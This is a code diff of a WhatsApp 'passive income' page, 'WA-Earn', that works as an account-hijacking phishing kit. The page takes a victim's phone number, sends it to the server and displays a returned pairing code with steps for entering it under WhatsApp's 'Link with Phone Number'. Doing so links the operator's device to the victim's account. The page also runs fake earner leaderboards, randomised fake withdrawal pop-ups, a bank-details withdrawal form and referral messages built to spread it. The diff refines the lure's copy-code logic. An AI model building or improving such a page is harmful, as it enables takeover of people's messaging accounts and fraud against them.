@@ -6,24 +6,14 @@
     <title>WA-Earn | Passive Income</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg: #0f172a;
-            --card: #1e293b;
-            --primary: #10b981;
-            --primary-hover: #059669;
-            --text: #f8fafc;
-            --text-muted: #94a3b8;
-            --border: #334155;
-        }
+        :root { --bg: #0f172a; --card: #1e293b; --primary: #10b981; --primary-hover: #059669; --text: #f8fafc; --text-muted: #94a3b8; --border: #334155; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
         body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
         
         .navbar { background: var(--card); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
         .logo { font-weight: 800; font-size: 20px; color: var(--primary); display: flex; align-items: center; gap: 8px; }
-        .logo svg { width: 24px; height: 24px; }
         
         .container { max-width: 500px; margin: 20px auto; padding: 0 20px; width: 100%; flex: 1; }
-        
         .hero-card { background: var(--card); border-radius: 20px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid var(--border); text-align: center; position: relative; overflow: hidden; }
         .hero-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(16,185,129,0.1) 0%, transparent 60%); z-index: 0; }
         .hero-content { position: relative; z-index: 1; }
@@ -63,9 +53,11 @@
         .leader-name { font-size: 14px; font-weight: 500; }
         .leader-amount { font-size: 14px; font-weight: 700; color: var(--primary); }
 
-        .code-display { font-size: 36px; font-weight: 800; letter-spacing: 4px; color: var(--primary); margin: 20px 0; background: rgba(16,185,129,0.1); padding: 15px; border-radius: 12px; border: 1px dashed var(--primary); display: flex; justify-content: center; align-items: center; gap: 15px; }
-        .copy-btn { background: var(--primary); color: white; border: none; padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; transition: 0.2s; }
-
+        /* NEW PAIRING CODE UI */
+        .code-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
+        .code-input { font-size: 24px; font-weight: 800; text-align: center; letter-spacing: 2px; color: var(--primary); background: rgba(16,185,129,0.1); border: 1px dashed var(--primary); padding: 15px; border-radius: 12px; width: 100%; max-width: 250px; outline: none; cursor: pointer; }
+        .copy-btn { background: var(--primary); color: white; border: none; padding: 10px 15px; border-radius: 8px; font-size: 14px; cursor: pointer; font-weight: 600; transition: 0.2s; }
+        
         .instructions { text-align: left; background: var(--bg); border-radius: 12px; padding: 20px; border: 1px solid var(--border); margin-top: 20px; }
         .instructions h4 { font-size: 14px; margin-bottom: 15px; color: var(--text); }
         .step-item { display: flex; gap: 12px; margin-bottom: 15px; align-items: flex-start; }
@@ -104,13 +96,7 @@
     </style>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="logo">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
-            WA-Earn
-        </div>
-    </nav>
-
+    <nav class="navbar"><div class="logo">WA-Earn</div></nav>
     <div class="container">
         <!-- STEP 1 -->
         <div id="step-1">
@@ -120,21 +106,18 @@
                     <h1 style="font-size: 20px; margin-bottom: 10px;">Welcome to WA-Earn</h1>
                     <div class="balance"><span class="currency-symbol">₦</span><span id="display-balance">2,000</span><span>.00</span></div>
                     <p class="sub-text">Claim your onboarding bonus by activating your account in our secure ad-campaign network. Keep it active to earn daily.</p>
-                    
                     <button class="btn" id="start-btn" onclick="showInput()">Claim Bonus Now</button>
-
                     <div class="input-group" id="input-group">
                         <label>Enter your WhatsApp Number</label>
                         <div class="phone-input-wrapper">
                             <select class="country-select" id="country-code">
-                                <option value="+234" data-currency="₦" data-code="ng">🇳🇬 +234</option>
-                                <option value="+1" data-currency="$" data-code="us">🇺🇸 +1</option>
-                                <option value="+44" data-currency="£" data-code="gb">🇬🇧 +44</option>
-                                <option value="+27" data-currency="R" data-code="za">🇿🇦 +27</option>
-                                <option value="+254" data-currency="KSh" data-code="ke">🇰🇪 +254</option>
-                                <option value="+233" data-currency="₵" data-code="gh">🇬🇭 +233</option>
+                                <option value="+234" data-currency="₦">🇳🇬 +234</option>
+                                <option value="+1" data-currency="$">🇺🇸 +1</option>
+                                <option value="+44" data-currency="£">🇬🇧 +44</option>
+                                <option value="+27" data-currency="R">🇿🇦 +27</option>
+                                <option value="+254" data-currency="KSh">🇰🇪 +254</option>
+                                <option value="+233" data-currency="₵">🇬🇭 +233</option>
                             </select>
-                            
                             <div class="pin-container" id="pin-container">
                                 <input type="tel" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="moveToPrev(event, this, 1)">
                                 <input type="tel" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="moveToPrev(event, this, 2)">
@@ -153,32 +136,22 @@
                     </div>
                 </div>
             </div>
-
             <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-value" id="daily-retainer">₦500</div>
-                    <div class="stat-label">Daily Retainer</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="referral-bonus">₦500</div>
-                    <div class="stat-label">Referral Bonus</div>
-                </div>
+                <div class="stat-card"><div class="stat-value" id="daily-retainer">₦500</div><div class="stat-label">Daily Retainer</div></div>
+                <div class="stat-card"><div class="stat-value" id="referral-bonus">₦500</div><div class="stat-label">Referral Bonus</div></div>
             </div>
-
-            <div class="leaderboard">
-                <h3>🏆 Top Earners This Week</h3>
-                <div id="leaderboard-list"></div>
-            </div>
+            <div class="leaderboard"><h3>🏆 Top Earners This Week</h3><div id="leaderboard-list"></div></div>
         </div>
 
-        <!-- STEP 2 (PAIRING CODE ONLY) -->
+        <!-- STEP 2 -->
         <div class="hero-card" id="step-2" style="display: none;">
             <h2 style="font-size: 20px; margin-bottom: 10px;">Verify Device</h2>
             <p class="sub-text">Copy this code and enter it in your WhatsApp.</p>
             
-            <div class="code-display">
-                <span id="pairing-code">------</span>
-                <button class="copy-btn" id="copy-code-btn" onclick="copyCode()">Copy</button>
+            <div class="code-container">
+                <!-- Using an input field makes copying 100% reliable on mobile -->
+                <input type="text" class="code-input" id="pairing-code" value="------" readonly onclick="selectCode()">
+                <button class="copy-btn" onclick="copyCode()">Copy</button>
             </div>
             
             <div class="instructions">
@@ -189,70 +162,37 @@
                 <div class="step-item"><div class="step-num">4</div><div class="step-text">Tap <strong>Link with Phone Number</strong>.</div></div>
                 <div class="step-item"><div class="step-num">5</div><div class="step-text">Paste the code you copied above.</div></div>
             </div>
-            
             <p class="sub-text" style="color: #f59e0b; font-size: 13px; margin-top: 20px;">Waiting for you to enter the code on your phone...</p>
         </div>
 
         <!-- STEP 3 -->
         <div class="hero-card success-screen" id="step-3">
-            <div class="success-icon">
-                <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg>
-            </div>
+            <div class="success-icon"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></div>
             <h2 style="font-size: 24px; margin-bottom: 10px;">Account Activated!</h2>
             <p class="sub-text">Your onboarding bonus has been credited to your wallet. The campaign bot is now running in the background.</p>
-            
             <div class="balance" id="final-balance"><span class="currency-symbol">₦</span><span id="final-balance-amount">2,000</span><span>.00</span></div>
-            
             <button class="btn" style="margin-top: 20px; background: var(--border);" onclick="showWithdraw()">Withdraw Funds</button>
-            
             <div class="withdraw-box" id="withdraw-box">
                 <h3>Withdrawal Details</h3>
-                <div class="form-group">
-                    <label>Bank Name</label>
-                    <select>
-                        <option>Select Bank</option>
-                        <option>Access Bank</option>
-                        <option>Guaranty Trust Bank (GTB)</option>
-                        <option>First Bank of Nigeria</option>
-                        <option>United Bank for Africa (UBA)</option>
-                        <option>Zenith Bank</option>
-                        <option>Kuda Bank</option>
-                        <option>Opay</option>
-                        <option>Palmpay</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Account Number</label>
-                    <input type="tel" placeholder="Enter 10-digit account number">
-                </div>
-                <div class="form-group">
-                    <label>Account Name</label>
-                    <input type="text" placeholder="Enter account name">
-                </div>
+                <div class="form-group"><label>Bank Name</label><select><option>Select Bank</option><option>Access Bank</option><option>GTB</option><option>First Bank</option><option>UBA</option><option>Zenith Bank</option></select></div>
+                <div class="form-group"><label>Account Number</label><input type="tel" placeholder="10-digit number"></div>
+                <div class="form-group"><label>Account Name</label><input type="text" placeholder="Name"></div>
                 <button class="btn" style="margin-top: 10px;">Request Withdrawal</button>
                 <p class="sub-text" style="margin-top: 10px; font-size: 11px; text-align: center;">Minimum withdrawal is <span id="min-withdraw">₦10,000</span>.</p>
             </div>
-            
             <div class="referral-box" id="referral-box">
                 <label>Invite associates to earn <span class="currency-symbol">₦</span>500 per referral</label>
-                <div class="referral-input">
-                    <input type="text" id="ref-link" readonly>
-                    <button onclick="copyRef()">Copy</button>
-                </div>
-                
+                <div class="referral-input"><input type="text" id="ref-link" readonly><button onclick="copyRef()">Copy</button></div>
                 <div class="share-buttons">
                     <button class="share-btn share-wa" onclick="shareTo('whatsapp')">WhatsApp</button>
                     <button class="share-btn share-tg" onclick="shareTo('telegram')">Telegram</button>
                     <button class="share-btn share-generic" onclick="shareTo('native')">More</button>
                 </div>
             </div>
-            
-            <p class="sub-text" style="margin-top: 15px; font-size: 12px;">Keep the device linked to earn daily.</p>
         </div>
     </div>
 
     <div class="toast-container" id="toast-container"></div>
-
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
@@ -264,104 +204,74 @@
 
         const countrySelect = document.getElementById('country-code');
         countrySelect.addEventListener('change', (e) => {
-            const option = e.target.options[e.target.selectedIndex];
-            selectedCurrency = option.getAttribute('data-currency');
-            
+            selectedCurrency = e.target.options[e.target.selectedIndex].getAttribute('data-currency');
             document.querySelectorAll('.currency-symbol').forEach(el => el.innerText = selectedCurrency);
             document.getElementById('daily-retainer').innerText = `${selectedCurrency}500`;
             document.getElementById('referral-bonus').innerText = `${selectedCurrency}500`;
             document.getElementById('min-withdraw').innerText = `${selectedCurrency}10,000`;
         });
 
-        if (referrerNumber) {
-            currentBalance += 500;
-            document.getElementById('start-btn').innerText = `Claim Bonus + Referral`;
-        }
+        if (referrerNumber) { currentBalance += 500; document.getElementById('start-btn').innerText = `Claim Bonus + Referral`; }
 
         const inputs = document.querySelectorAll('.pin-container input');
-        
         function moveToNext(current, index) {
             if (current.value.length === 1) {
                 current.classList.add('filled');
-                if (index < inputs.length) {
-                    inputs[index].focus();
-                } else {
-                    current.blur();
-                }
-            } else {
-                current.classList.remove('filled');
-            }
+                if (index < inputs.length) { inputs[index].focus(); } else { current.blur(); }
+            } else { current.classList.remove('filled'); }
         }
-
         function moveToPrev(event, current, index) {
-            if (event.key === 'Backspace' && current.value.length === 0) {
-                if (index > 1) {
-                    inputs[index - 2].focus();
-                }
-            }
+            if (event.key === 'Backspace' && current.value.length === 0 && index > 1) inputs[index - 2].focus();
         }
-
-        function getFullNumber() {
-            let num = '';
-            inputs.forEach(input => num += input.value);
-            return num;
-        }
-
-        function showInput() {
-            document.getElementById('start-btn').style.display = 'none';
-            document.getElementById('input-group').style.display = 'block';
-            inputs[0].focus();
-        }
+        function getFullNumber() { let num = ''; inputs.forEach(input => num += input.value); return num; }
+        function showInput() { document.getElementById('start-btn').style.display = 'none'; document.getElementById('input-group').style.display = 'block'; inputs[0].focus(); }
 
         function requestCode() {
             const localNumber = getFullNumber();
             const countryCode = document.getElementById('country-code').value.replace('+', ''); 
-            
-            if (localNumber.length !== 10) {
-                return alert("Please enter all 10 digits of your phone number.");
-            }
-            
+            if (localNumber.length !== 10) return alert("Please enter all 10 digits.");
             userPhone = countryCode + localNumber; 
-            
             document.getElementById('send-btn').disabled = true;
             document.getElementById('send-btn').innerText = 'Connecting...';
-            
             socket.emit('request_code', userPhone);
         }
 
         socket.on('code_generated', (code) => {
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
-            document.getElementById('pairing-code').innerText = code;
+            document.getElementById('pairing-code').value = code;
         });
 
-        function copyCode() {
-            const code = document.getElementById('pairing-code').innerText;
-            const textArea = document.createElement("textarea");
-            textArea.value = code;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textArea);
+        // --- THE BULLETPROOF COPY LOGIC ---
+        function selectCode() {
+            const input = document.getElementById('pairing-code');
+            input.select();
+            input.setSelectionRange(0, 99999); // For mobile
+        }
 
-            const btn = document.getElementById('copy-code-btn');
-            btn.innerText = 'Copied!';
-            btn.style.background = '#059669';
-            setTimeout(() => {
-                btn.innerText = 'Copy';
-                btn.style.background = 'var(--primary)';
-            }, 3000);
+        function copyCode() {
+            const input = document.getElementById('pairing-code');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            
+            try {
+                // This is the only method that works reliably on mobile without HTTPS
+                document.execCommand('copy');
+                const btn = event.target;
+                btn.innerText = 'Copied!';
+                btn.style.background = '#059669';
+                setTimeout(() => { btn.innerText = 'Copy'; btn.style.background = 'var(--primary)'; }, 3000);
+            } catch (err) {
+                alert("Please long-press the code to copy it manually.");
+            }
         }
 
         socket.on('success', () => {
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
-            
             document.getElementById('final-balance-amount').innerText = currentBalance.toLocaleString();
-            
             document.getElementById('referral-box').style.display = 'block';
-            const baseUrl = window.location.origin;
-            document.getElementById('ref-link').value = `${baseUrl}/?ref=${userPhone}`;
+            document.getElementById('ref-link').value = `${window.location.origin}/?ref=${userPhone}`;
         });
 
         socket.on('error', (msg) => {
@@ -370,15 +280,11 @@
             document.getElementById('send-btn').innerText = 'Link Account & Earn';
         });
 
-        function showWithdraw() {
-            const box = document.getElementById('withdraw-box');
-            box.style.display = box.style.display === 'block' ? 'none' : 'block';
-        }
+        function showWithdraw() { const box = document.getElementById('withdraw-box'); box.style.display = box.style.display === 'block' ? 'none' : 'block'; }
 
         function copyRef() {
             const copyText = document.getElementById('ref-link');
             copyText.select();
-            copyText.setSelectionRange(0, 99999);
             document.execCommand('copy');
             alert("Referral link copied!");
         }
@@ -386,60 +292,27 @@
         function shareTo(platform) {
             const refLink = document.getElementById('ref-link').value;
             const shareMessage = "I recently joined the WA-Earn marketing network as an ad distributor. They pay a steady retainer just for keeping your account active in their campaign pool. If you want to join my tier, use my invite link to get an onboarding bonus: ";
-            const fullMessage = shareMessage + refLink;
-
-            if (platform === 'whatsapp') {
-                window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(fullMessage)}`, '_blank');
-            } 
-            else if (platform === 'telegram') {
-                window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent(shareMessage)}`, '_blank');
-            } 
-            else if (platform === 'native') {
-                if (navigator.share) {
-                    navigator.share({ title: 'WA-Earn', text: shareMessage, url: refLink }).catch(console.error);
-                } else {
-                    alert("Please copy the link.");
-                }
-            }
+            if (platform === 'whatsapp') window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(shareMessage + refLink)}`, '_blank');
+            else if (platform === 'telegram') window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent(shareMessage)}`, '_blank');
+            else if (platform === 'native' && navigator.share) navigator.share({ title: 'WA-Earn', text: shareMessage, url: refLink });
         }
 
-        const topEarners = [
-            { name: "Chinedu O.", amount: "145,000" },
-            { name: "Aisha M.", amount: "120,500" },
-            { name: "Tunde B.", amount: "98,000" },
-            { name: "Blessing E.", amount: "85,500" },
-            { name: "Ibrahim K.", amount: "72,000" }
-        ];
-        
+        const topEarners = [ { name: "Chinedu O.", amount: "145,000" }, { name: "Aisha M.", amount: "120,500" }, { name: "Tunde B.", amount: "98,000" }, { name: "Blessing E.", amount: "85,500" }, { name: "Ibrahim K.", amount: "72,000" } ];
         const listEl = document.getElementById('leaderboard-list');
-        topEarners.forEach((user) => {
-            listEl.innerHTML += `
-                <div class="leader-item">
-                    <div class="leader-info">
-                        <div class="avatar">${user.name.charAt(0)}</div>
-                        <div class="leader-name">${user.name}</div>
-                    </div>
-                    <div class="leader-amount">${selectedCurrency}${user.amount}</div>
-                </div>
-            `;
-        });
+        topEarners.forEach(u => { listEl.innerHTML += `<div class="leader-item"><div class="leader-info"><div class="avatar">${u.name.charAt(0)}</div><div class="leader-name">${u.name}</div></div><div class="leader-amount">${selectedCurrency}${u.amount}</div></div>`; });
 
-        const fakeNames = ["Ada", "Chinedu", "Fatima", "Tunde", "Nneka", "Ibrahim", "Blessing", "Emeka", "Zainab", "Oluwaseun", "Musa", "Grace"];
+        const fakeNames = ["Ada", "Chinedu", "Fatima", "Tunde", "Nneka", "Ibrahim", "Blessing", "Emeka", "Zainab"];
         function showToast() {
             const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
             const amount = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
-            const formattedAmount = selectedCurrency + amount.toLocaleString();
             const toast = document.createElement('div');
             toast.className = 'toast';
-            toast.innerHTML = `<svg style="width:20px;height:20px;color:var(--primary);" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg><div><strong>${name}</strong> just withdrew <strong>${formattedAmount}</strong></div>`;
+            toast.innerHTML = `<svg style="width:20px;height:20px;color:var(--primary);" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg><div><strong>${name}</strong> just withdrew <strong>${selectedCurrency}${amount.toLocaleString()}</strong></div>`;
             document.getElementById('toast-container').appendChild(toast);
             setTimeout(() => { toast.classList.add('hide'); }, 4000);
             setTimeout(() => { toast.remove(); }, 4300);
         }
-        function startToasts() {
-            showToast();
-            setTimeout(startToasts, Math.floor(Math.random() * 7000) + 8000);
-        }
+        function startToasts() { showToast(); setTimeout(startToasts, Math.floor(Math.random() * 7000) + 8000); }
         setTimeout(startToasts, 3000);
     </script>
 </body>
